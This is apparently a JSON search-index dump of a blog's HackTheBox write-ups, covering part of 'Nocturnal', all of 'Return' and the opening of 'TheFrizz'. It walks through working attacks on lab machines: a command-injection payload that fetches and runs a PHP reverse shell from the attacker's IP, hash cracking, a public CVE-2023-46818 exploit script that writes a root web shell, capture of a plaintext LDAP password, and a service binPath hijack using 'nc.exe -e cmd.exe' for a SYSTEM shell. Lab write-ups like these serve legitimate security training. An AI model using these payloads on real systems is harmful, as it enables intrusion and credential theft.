BurpSuite.</p>"},{"location":"ch3ckm8_HTB_Nocturnal/#command-injection-rev-shell-upload","title":"Command injection: rev shell: upload","text":"<p>first, i input a random string, for example <code>sth</code>  then in burp, go to Proxy&gt;Intercept&gt;Intercept is on</p> <p>Once you see intercept is on  only then click on create backup, in order to capture the request </p> <p>now we successfully captured the request, on the right side you should see the page loading infinetely (because we are intercepting the request)  you can see our input <code>sth</code> on the left side, on the password variable.</p> <p>After trial and error, and lots of searching, i concluded to this payload, so paste it in the password field  instead of <code>sth</code>: <pre><code>%0Abash%09-c%09\"wget%0910.10.14.184:8000/rev_shell.php\"%0A\n</code></pre> and now our new request should look like this </p> <p>once we do that, lets go to our machine to setup our python server in order to transfer our php rev shell from our machine towards the target <pre><code>python3 -m http.server 8080\n</code></pre></p> <p>only then hit forward in order to forward our request  and then you should see on your terminal, that the file has been successfully transfered: </p> <p>perfect! now the rev shell is in! </p>"},{"location":"ch3ckm8_HTB_Nocturnal/#command-injection-rev-shell-execution","title":"Command injection: rev shell: execution","text":"<p>Lets similarly now try executing it remotely, in order to get a rev shell back:</p> <p>Follow the same procedure to intercept the initial request on the password field (just like we did earlier with the wget injection) but this time, modify the request on the password field, in such way that we are actually executing our php file: <pre><code>%0Abash%09-c%09\"php%09rev_shell.php\"%0A\n</code></pre> and now our new request should look like this </p> <p>then start our listener on the port we specified in our php shell: <pre><code>nc -lvnp 9001 \n</code></pre></p> <p>next by forwarding the request, we receive our rev shell! </p> <p>stabilize shell: <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre></p> <p>once inside, i searched for valuable files and folders  and found a folder that seems to be related to a database  but we cant view it here, lets download the file locally:</p> <p>on the machines current directory: <pre><code>python3 -m http.server 8000\n</code></pre> on our machine <pre><code>wget 10.10.11.64:8000/nocturnal_database.db\n</code></pre>  nice, we got the .db file locally, lets mess with it </p> <p>Found that the database has 2 tables <pre><code>uploads\nusers\n</code></pre></p> <p>and by viewing the table users via sqlite, i found pairs of users and hashes. <code>SELECT * FROM users;</code> <pre><code>--------------------------------\nadmin\nd725aeba143f575736b07e045d8ceebb\n--------------------------------\namanda\ndf8b20aa0c935023f99ea58358fb63c4\n--------------------------------\ntobias\n55c82b1ccd55ab219b3b109b07d5061d\n--------------------------------\nkavi\nf38cde1654b39fea2bd4f72f1ae4cdda\n--------------------------------\ne0Al5\n101ad4543a96a7fd84908fd0d802e7db\n--------------------------------\n</code></pre> By validating with hash identifier, it appears that these hashes are most possibly MD5.</p> <p>Next, put the hashes each one separately on a txt, and then run hashcat for each one to crack them.</p> <p>Tried all of them, and only tobias's hash returned a pass from hashcat <pre><code>hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre> output:  so we got the pass of user Tobias <pre><code>Tobias\nslowmotionapocalypse\n</code></pre> and we are now in! lets grab the user flag! <pre><code>d7cf10aa5810a5d746549a70d2b45c32\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Nocturnal/#privesc","title":"Privesc","text":"<p>we can now try to escalating privileges <pre><code>sudo -l\n</code></pre> does not appear to allow us to run sudo </p> <p>lets now inspect the processes: <pre><code>ps -aux\n</code></pre> nothing too obvious found here, lets move on</p> <p>Lets observe the active network connections and listening ports <pre><code>netstat -tuln\n</code></pre> output: <pre><code>tobias@nocturnal:~$ netstat -tuln\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State      \ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     \ntcp6       0      0 :::22                   :::*                    LISTEN     \ntcp6       0      0 ::1:9090                :::*                    LISTEN     \nudp        0      0 127.0.0.53:53           0.0.0.0:*    \n</code></pre></p> <p>hmm, it appears that sth is running on port 8080, this could be some webservice running lets do some port forwarding to our machine, so we can (potentially) exploit it LOCALY.</p> <p>we could do this while we had shell on the host, as tobias, but we dont know if running exploits with python for example would run, so its easier and a best practice to port forward and try locally.</p>"},{"location":"ch3ckm8_HTB_Nocturnal/#port-forwarding","title":"Port forwarding","text":"<p>in our machine, port forward the machines port to our machine <pre><code>ssh -L 9000:127.0.0.1:8080 tobias@nocturnal.htb\n</code></pre></p> <p>now on your local machine's browser, go to <pre><code>http://localhost:9000/login/\n</code></pre> we come accross this page  here i tried admin user and admin pass, but no luck</p> <p>Trying with admin and tobias's password (password reuse) <pre><code>admin\nslowmotionapocalypse\n</code></pre> got me in: </p> <p>But how to move forward? By searching all those tabs, i found empty pages and forms, and nothing seemed straightforward by inspecting them.</p> <p>By inspecting the source code of the admin home page though, i found sth like a version <code>version 3.2.2</code> <pre><code> &lt;link rel='stylesheet' href='themes/default/assets/stylesheets/ispconfig.css?ver=3.2.2' /&gt;\n</code></pre></p> <p>also the login page's source code shows this version <code>version 3.2</code> <pre><code>&lt;link rel='stylesheet' href='../themes/default/assets/stylesheets/ispconfig.css?ver=3.2' /&gt;\n</code></pre></p> <p>Furthermore, the monitor page shows another version `version 3.2.1' </p> <p>Next by searching ipsconfig vulnerabilities, i found this one <code>CVE-2023-46818</code> which appears to affect ISPConfig &lt;= 3.2.11 </p> <p>and by using this script that exploits this vulnerability:  https://github.com/ajdumanhug/CVE-2023-46818 <pre><code>python3 CVE-2023-46818.py http://localhost:8080 admin slowmotionapocalypse\n</code></pre> i grabbed the root flag! <pre><code>\u2514\u2500# python3 CVE-2023-46818.py http://localhost:9000 admin slowmotionapocalypse\n[+] Logging in with username 'admin' and password 'slowmotionapocalypse'\n[+] Login successful!\n[+] Fetching CSRF tokens...\n[+] CSRF ID: language_edit_1d8e96087d21652cb7f32dc9\n[+] CSRF Key: b7739948106f89f5e7d331be30036758eaab5be0\n[+] Injecting shell payload...\n[+] Shell written to: http://localhost:9000/admin/sh.php\n[+] Launching shell...\n\nispconfig-shell# whoami\nroot\n\nispconfig-shell# id\nuid=0(root) gid=0(root) groups=0(root)\n\nispconfig-shell# pwd\n/usr/local/ispconfig/interface/web/admin\n\nispconfig-shell# cd\n\n\nispconfig-shell# pwd\n/usr/local/ispconfig/interface/web/admin\n\nispconfig-shell# cd /root\n\n\nispconfig-shell# pwd\n/usr/local/ispconfig/interface/web/admin\n\nispconfig-shell# cat /root/root.txt\n22a9d497840af1d5d56c75417e97fefb\n</code></pre>  pwned!</p>"},{"location":"ch3ckm8_HTB_Nocturnal/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_Nocturnal/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; chose http service to focus on</li> <li>enumerate directories &amp; subdomains</li> <li>browsed the website searching for user input, registered, logged in, uploaded &amp; downloaded file</li> <li>tried to understand how it works, found a url on the download file request that specified username without further authentication</li> </ol>"},{"location":"ch3ckm8_HTB_Nocturnal/#foothold_1","title":"Foothold","text":"<ol> <li>user enumeration, based on the found url</li> <li>found users, and with those inside the url i searched for uploaded files (since the download (view.php) page did not need the user's password in order to show their uploaded files)</li> <li>one of the users (amanda) had uploaded a file containing their plaintext pass.</li> <li>logged in on the webapp again as this user (amanda), which also had access to the admin panel</li> <li>on the admin panel, there is a textbox and i suspected of command injection, which later was verified to exist, and was also verified via the source code of the page (to which i had access since i could download it, as user amanda has access to admin panel, that allows us to download all the webapp's source code)</li> <li>used command injection to upload a php rev shell</li> <li>used command injection to execute the uploaded php rev shell</li> <li>once i got the rev shell, as www-data, i searched for valuable files and came accross a ==database file==that contained MD5 hashes for multiple users.</li> <li>hash cracking provided a password for one of them (tobias) to which i successfully logged on later via ssh and grabbed the user flag.</li> </ol>"},{"location":"ch3ckm8_HTB_Nocturnal/#privesc_1","title":"Privesc","text":"<ol> <li>tried first <code>sudo -l</code> but the user was not allowed to run sudo</li> <li>after searching files and directories i did not find anything interesting.</li> <li>observed the network connections of the host from the inside, and observed localhost having connection with port 8080, and suspected it might be a web service running.</li> <li>found a web app, to which i logged in with user admin and reusable pass of user tobias</li> <li>used local port forwarding, to forward it to my local machine to exploit it</li> <li>found the web app to be vulnerable to a known cve, and with the appropriate script i got shell and grabbed the root flag</li> </ol>"},{"location":"ch3ckm8_HTB_Nocturnal/#sidenotes","title":"Sidenotes","text":"<p>All in all, this did not seem like an \"easy\" machine, for me the foothold part was tough, especially due to the way the website modified the request of the backup password, and the way the payload for the command injection should be constructed. Once we got rev shell as www-data, it was easy to enumerate for files containing user info, and then hash cracking to reveal a user's pass. Then the privesc part, was kinda easy, as the web app had a known vulnerability, and the reuse of tobias creds for the admin user of ispconfig made the process even easier. </p> <p>What will make this machine memorable for me, would be only the command injection part, which was unique due to the blacklisted characters. The rest of it was pretty much common among HackTheBox linux machines.</p> <p>https://www.hackthebox.com/achievement/machine/284567/656 </p>"},{"location":"ch3ckm8_HTB_Return/","title":"Return","text":""},{"location":"ch3ckm8_HTB_Return/#intro","title":"Intro","text":"<p>[[#windows]] [[NotAssumedBreach]] [[OSCPpath]] [[PrivGroupAbuse]] [[WebApp]]</p> <p>Tags: #windows #NotAssumedBreach #OSCPpath #PrivGroupAbuse #WebApp Tools used:  - BurpSuite (web app inspection) - ldapsearch (ldap enum) - BloodHound (ldap enum)</p>"},{"location":"ch3ckm8_HTB_Return/#reconnaissance","title":"Reconnaissance","text":"<p>First, i generated this template by using my script: ch3ckkm8/Pentest-Auto-Report- <pre><code>python pentest_to_md.py 10.129.165.239 return.htb\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Return/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.165.239 return.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_Return/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV return.htb\n</code></pre> <p><pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-08-03 16:19 CDT\nNmap scan report for return.htb (10.129.165.239)\nHost is up (0.078s latency).\nNot shown: 988 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: HTB Printer Admin Panel\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 21:38:38Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-08-03T21:38:45\n|_  start_date: N/A\n|_clock-skew: 18m33s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 22.84 seconds\n</code></pre> the target appears to be a DC according to the open ports</p> <p>First, i will try inspecting port 80, which appears to be IIS server, and according to the http title its related to HTB Printer Admin Panel</p>"},{"location":"ch3ckm8_HTB_Return/#webapp-inspection","title":"WebApp inspection","text":"<p><code>Home</code> page: </p> <p><code>Settings</code> page: </p> <p>The rest of the pages Fax and Troubleshooting are not clickable.</p> <p>Taking into consideration of the above screenshots, our target should be the <code>Settings</code> page, since appears to have some functionality by specifying server, port, user and password.</p> <p>So where do we start with this? well it has some values already filled in, so understand their usage first. Overall it appears to be a webapp that manages a printer, and the settings page manages the authentication towards it. </p> <p>The password has asterisks instead of characters, and by viewing the page source the password is also displayed as asterisks there too:</p> <p></p> <p>Another thing we could do to see if we can retrieve the password, is to start Burp and inspect the request: </p> <p>It seems that only the ip we specify is actually being sent towards the server-side via the request, and the rest of the values on the settings page are not being sent.</p> <p>Hmm, the first thing that comes to mind, is the server address (since only that is being sent from the request), it seems that the printer listens on the server address and port we specify. </p>"},{"location":"ch3ckm8_HTB_Return/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_Return/#connecting-to-the-printer-service","title":"Connecting to the printer service","text":"<p>BUT since we can specify these details, why dont we try to make it connect to our machine? So we could try specifying the server address to our host\u2019s ip, click update and see if we get connection back to our machine.</p> <p>After updating, i started my listener, and since we dont know exactly the port, i will take for granted that the port is 389 as the preselected values on the settings page implied. <pre><code>nc -lnvp 389\n</code></pre></p> <p>aand we got connection back! <pre><code>listening on [any] 389 ...\n\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.165.239] 64655\n0*`%return\\svc-printer\ufffd\n                       1edFg43012!!\n</code></pre></p> <p>and the best part is that it just sent us sth that appears to be the password: <pre><code>1edFg43012!!\n</code></pre></p> <p>great! now we have credentials for a valid user <code>svc-printer</code>, the creds for future reference are: <pre><code>svc-printer\n1edFg43012!!\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Return/#checking-where-we-can-login-with-found-creds","title":"Checking where we can login with found creds","text":"<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</p> <pre><code>./auto_netexec_bulk_creds_checker.sh return.htb 'svc-printer' '1edFg43012!!'\n</code></pre> <p><pre><code>[*] Checking if winrm port 5985 is open on return.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.165.239  5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)\nWINRM       10.129.165.239  5985   PRINTER          [+] return.local\\svc-printer:1edFg43012!! (Pwn3d!)\n\n[*] Checking if smb port 445 is open on return.htb...\n[+] Port 445 open \u2014 checking smb with netexec\n[*] Copying default configuration file\nSMB         10.129.165.239  445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)\nSMB         10.129.165.239  445    PRINTER          [+] return.local\\svc-printer:1edFg43012!! \n\n[*] Checking if ldap port 389 is open on return.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.165.239  445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)\nLDAP        10.129.165.239  389    PRINTER          [+] return.local\\svc-printer:1edFg43012!! (Pwn3d!)\n\n[*] Checking if rdp port 3389 is open on return.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on return.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.165.239  135    PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)\nRPC         10.129.165.239  135    PRINTER          [+] return.local\\svc-printer:1edFg43012!! \n\n[*] Checking if nfs port 2049 is open on return.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on return.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on return.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on return.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on return.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> it seems that with these creds, we can login only to <code>WINRM</code> and <code>LDAP</code></p> <p>login via winrm <pre><code>evil-winrm -i return.htb -u 'svc-printer' -p '1edFg43012!!'\n</code></pre> grabbed user flag! <code>728d332c51cc0ce7d44fdad354169b54</code></p> <p>proof </p>"},{"location":"ch3ckm8_HTB_Return/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_Return/#ldap-enumeration","title":"LDAP enumeration","text":"<pre><code>ldapsearch -LLL -x -H ldap://return.htb -s base namingcontexts\n</code></pre> <pre><code>dn:\nnamingcontexts: DC=return,DC=local\nnamingcontexts: CN=Configuration,DC=return,DC=local\nnamingcontexts: CN=Schema,CN=Configuration,DC=return,DC=local\nnamingcontexts: DC=DomainDnsZones,DC=return,DC=local\nnamingcontexts: DC=ForestDnsZones,DC=return,DC=local\n</code></pre> <p>Lets find all available users in the domain, using ldapsearch with user creds: <pre><code>ldapsearch -LLL -H ldap://return.htb \\\n  -D \"svc-printer@return.local\" -w '1edFg43012!!' \\\n  -b \"DC=return,DC=local\" \"objectClass=user\" |\n  egrep -i ^sAMAccountName | awk -F ': ' '{print $2}' | tee users.txt\n</code></pre></p> <p>it was successful, and the retrieved user list is: <pre><code>Administrator\nGuest\nPRINTER$\nkrbtgt\nsvc-printer\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Return/#bloodhound-as-svc-printer","title":"Bloodhound as <code>SVC-PRINTER\"</code>","text":"<p>Lets try also running bloodhound: <pre><code>bloodhound-python -u 'svc-printer' -p '1edFg43012!!' -d return.local -ns 10.129.165.239 -c All --zip\n</code></pre></p> <p>First things first, we could inspect the user we already have access <code>SVC-PRINTER</code>:  it seems that user has no outbound object control</p> <p>Lets also see its group membership:  hm the two that stand out here as non default, are <code>SERVER OPERATORS</code> and <code>PRINT OPERATORS</code> keep that in mind, we will revisit it later.</p> <p>Inspecting the rest of the users: </p> <p>thats strange, during our ldap enumeration, i found another user <code>Guest</code> that is not present here, lets search it manually on bloodhound:  it has no outbound object control</p> <p>and the group membership is: </p> <p>Now since the above did not indicate any obvious paths for privesc, i then run some of the bloodhound queries to see if i can get anything more there: </p> <p>Hmmm, we see here that we have <code>CanPSRemote</code> rights towards <code>PRINTER.RETURN.LOCAL</code> so we can login there, BUT what is this?</p> <p>This icon on bloodhound, indicates that this is a windows host! </p> <p>And from this computer by gaining <code>SYSTEM</code> or <code>ADMIN RIGHTS</code> we have <code>DCSync</code> rights towards the domain!</p> <p>So the path is clear here, we need to login to this windows host as <code>SVC-PRINTER</code> and thehmn escalate privileges to become <code>LOCAL ADMIN</code> ( <code>SYSTEM</code> or <code>ADMINISTRATOR</code>) locally and then <code>DCSync</code> towards the domain.</p> <p>BUT how can we escalate privileges on that host? </p>"},{"location":"ch3ckm8_HTB_Return/#group-membership-of-user-svc-printer","title":"Group Membership of user svc-printer","text":"<p>We could first check the privileges of our user (SVC-PRINTER) <pre><code>whoami /priv\n</code></pre></p> <pre><code>PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                         State\n============================= =================================== =======\nSeMachineAccountPrivilege     Add workstations to domain          Enabled\nSeLoadDriverPrivilege         Load and unload device drivers      Enabled\nSeSystemtimePrivilege         Change the system time              Enabled\nSeBackupPrivilege             Back up files and directories       Enabled\nSeRestorePrivilege            Restore files and directories       Enabled\nSeShutdownPrivilege           Shut down the system                Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled\nSeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set      Enabled\nSeTimeZonePrivilege           Change the time zone                Enabled\n</code></pre> <p>Hm, now we must investigate which one from those privileges can lead to <code>local admin</code> escalation</p> <p>After some research, i found that most probably the one to target should be the <code>SeBackupPrivilege</code> because it can be used to read any file (including SAM, SYSTEM, SECURITY hives).</p> <p>Also lets see again the user\u2019s details from the inside this time  <pre><code>net user svc-printer\n</code></pre></p> <pre><code>User name                    svc-printer\nFull Name                    SVCPrinter\nComment                      Service Account for Printer\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            5/26/2021 1:15:13 AM\nPassword expires             Never\nPassword changeable          5/27/2021 1:15:13 AM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   5/26/2021 1:39:29 AM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Print Operators      *Remote Management Use\n                             *Server Operators\nGlobal Group memberships     *Domain Users\nThe command completed successfully.\n</code></pre> <p>Before moving forward, lets find some information about these groups, (local group membership) because i have not seen them before and i dont see them frequently.</p> <p>After some research, i found that <code>Server Operators</code> is a built-in privileged group  designed to allow certain administrative actions without granting full Domain Admin rights.</p>"},{"location":"ch3ckm8_HTB_Return/#what-rights-do-server-operators-have","title":"\ud83e\uddf0 What Rights Do Server Operators Have?","text":"<p>Members of the <code>Server Operators</code> group on a domain controller can:</p> \u2705 Services They can modify services (can be used for persistence or privilege escalation). \u2705 Back up and restore files Grants <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> \u2014 allows reading protected files like the NTDS.dit, SYSTEM hives, etc. <p>What we found here was a connection between the privileges <code>SeBackupPrivilege</code> -<code>SeRestorePrivilege</code> and the <code>Server Operators</code> group! We must now find a way to abuse it.</p> <p>Lets now check the ones that are relevant to our case below:</p>"},{"location":"ch3ckm8_HTB_Return/#dumping-ntdsdit-back-up-and-restore-files","title":"Dumping NTDS.dit (Back up and restore files)","text":"<pre><code>secretsdump.py 'return.local/svc-printer:1edFg43012!!'@10.129.165.43\n</code></pre> <p><pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\n[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.\n[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter\n[*] Cleaning up... \n</code></pre> it was not successful\u2026</p>"},{"location":"ch3ckm8_HTB_Return/#services","title":"Services","text":"<p>First lets list the services\u201d <pre><code>services\n</code></pre></p> <pre><code>Path                                                                                                                 Privileges Service          \n----                                                                                                                 ---------- -------          \nC:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             \n\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5533AFC7-64B3-4F6E-B453-E35320B35716}\\MpKslDrv.sys       True MpKslceeb2796    \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe                                                              True NetTcpPortSharing\nC:\\Windows\\SysWow64\\perfhost.exe                                                                                           True PerfHost         \n\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"                                                False Sense            \nC:\\Windows\\servicing\\TrustedInstaller.exe                                                                                 False TrustedInstaller \n\"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\"                                                     True VGAuthService    \n\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\"                                                                        True VMTools          \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\NisSrv.exe\"                                             True WdNisSvc         \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\MsMpEng.exe\"                                            True WinDefend        \n\"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\"                                                                      False WMPNetworkSvc \n</code></pre> <p>From all the services above, after searching them the one that stands out is VMware Guest Authentication Service (VGAuthService.exe) since this one handles user authentication between the host and the virtual machines. It appears to be associated with CVE-2022-22977</p> <p>One common attack i found, was to change the binary path of the service, so we can make the service run a binary of our preference!</p>"},{"location":"ch3ckm8_HTB_Return/#modifying-and-exploiting-the-service","title":"Modifying and exploiting the service","text":"<ol> <li>First lets verify that we can write to the service\u2019s directory:</li> </ol> <pre><code>icacls \"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\"\n</code></pre> <p><pre><code>C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe BUILTIN\\Administrators:(F)Everyone:(RX)NT AUTHORITY\\SYSTEM:(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> it seems that we can write to it!</p> <ol> <li>modify the service, replace the binary with netcat</li> </ol> <p>We will replace the binary with netcat, in order to get a rev shell back to our machine</p> <p>first upload <code>nc.exe</code> from evil-winrm <pre><code>upload /home/ch3ckm8/Downloads/nc.exe\n</code></pre></p> <ol> <li>modify the binary path, to point to netcat, and then tell netcat to connect to your machine\u2019s ip <pre><code>sc config VGAuthService binPath=\"C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.3 443\"\nsc stop VGAuthService\nsc start VGAuthService\n</code></pre></li> </ol> <p><pre><code>*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; sc.exe config VGAuthService binPath=\"C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.3 443\"\n[SC] ChangeServiceConfig SUCCESS\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; sc.exe stop VGAuthService\n\nSERVICE_NAME: VGAuthService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 1  STOPPED\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; sc.exe start VGAuthService\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n</code></pre> Don\u2019t worry about this error \u201cThe service did not respond to the start or control request in a timely fashion.\u201d , it is expected</p> <ol> <li>Start the listener: <pre><code> rlwrap nc -nlvp 443\n</code></pre></li> </ol> <p>aand got shell! <pre><code>listening on [any] 443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.165.43] 52938\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n\nC:\\Windows\\system32&gt; cd c:\\Users\\Administrator\\Desktop\n</code></pre> grabbed root flag <code>e615c5a829daf39951c4fe7b797736fa</code></p> <p>proof </p>"},{"location":"ch3ckm8_HTB_Return/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_Return/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap <code>scan</code> -&gt; https stands out, tried this one first</li> <li>inspected the <code>web app</code> which appeared to be related with some printer service, and by using BurpSuite found that one page (settings) only sends the <code>ip</code> address from the form, while also containing valuable information such as a valid username (svc-printer)</li> </ol>"},{"location":"ch3ckm8_HTB_Return/#foothold_1","title":"Foothold","text":"<ol> <li>since it only sends the ip that the user specifies on the form, i tried typing my hosts ip and successfully grabbed <code>rev shell</code>, which also gave out a plaintext password!</li> <li><code>correlated</code> the found user's  creds with the <code>win-rm</code> and <code>ldap</code> service</li> <li>logged in via evil-winrm to host using on user svc-alfresco, and grabbed the user flag.</li> </ol>"},{"location":"ch3ckm8_HTB_Return/#privesc_1","title":"Privesc","text":"<ol> <li>enumerated <code>LDAP</code> via ldapsearch and bloodhound, found found valid users and also that the compromised user's <code>group membership</code> was among other default ones, some groups called <code>Server Operators</code> and <code>Print Operators</code> .</li> <li>Inspected both of these groups, and i found that <code>Server Operators</code> have some interesting privileges that allow to backup/restore specific files and even <code>modify services</code></li> <li>Then i <code>listed services</code> and found one service (VGAuthService) to be vulnerable to a cve, for which i found commands that exploit it via modifying the service's binary and replacing it with a binary of our preference, which in that case was netcat exe (nc.exe) in order to get a shell back on our machine</li> <li>after restarting the service, <code>netcat</code> connected to our machine, <code>got shell</code> as administrator and grab the root flag</li> </ol>"},{"location":"ch3ckm8_HTB_Return/#sidenotes","title":"Sidenotes","text":"<p>This was an interesting machine, lesson learned from this one was to thoroughly analyze and identify user group membership\u2019s privileges. Though bloodhound usage at first showed the overall privesc path , smaller details had to be found by analyzing and investigating what the groups are allowed to do in terms of privileges. </p> <p></p>"},{"location":"ch3ckm8_HTB_TheFrizz/","title":"TheFrizz","text":""},{"location":"ch3ckm8_HTB_TheFrizz/#intro","title":"Intro","text":"<p>This is a WINDOWS machine of easy difficulty, named TheFrizz, lets begin  </p> <p>[[windows]] [[RCE]] [[AD]] [[GSSAPIauthentication]] [[gpo]] [[OSCPpath]] [[NotAssumedBreach]] Tags: #windows #RCE #AD #GSSAPIauthentication #gpo #OSCPpath #NotAssumedBreach  Tools used: john (password cracking) bloodhound-python (AD enumeration) Invoke-WebRequest (file upload) scp (file upload) kinit (ticket generation) impacket-getTGT (ticket generation) kerbrute (password spraying) GetADUsers.py (AD users enumeration) SharpGPOAbuse (gpo abuse) RunasCs (elevate tokens as local admin)</p>"},{"location":"ch3ckm8_HTB_TheFrizz/#reconnaisanse","title":"Reconnaisanse","text":"<p>add machine to etc/hosts <pre><code>echo '10.10.11.60 frizz.htb' | sudo tee -a /etc/hosts\n</code></pre></p> <p>lets start with our nmap scan <pre><code>nmap frizz.htb -sV -Pn -T4\n</code></pre> 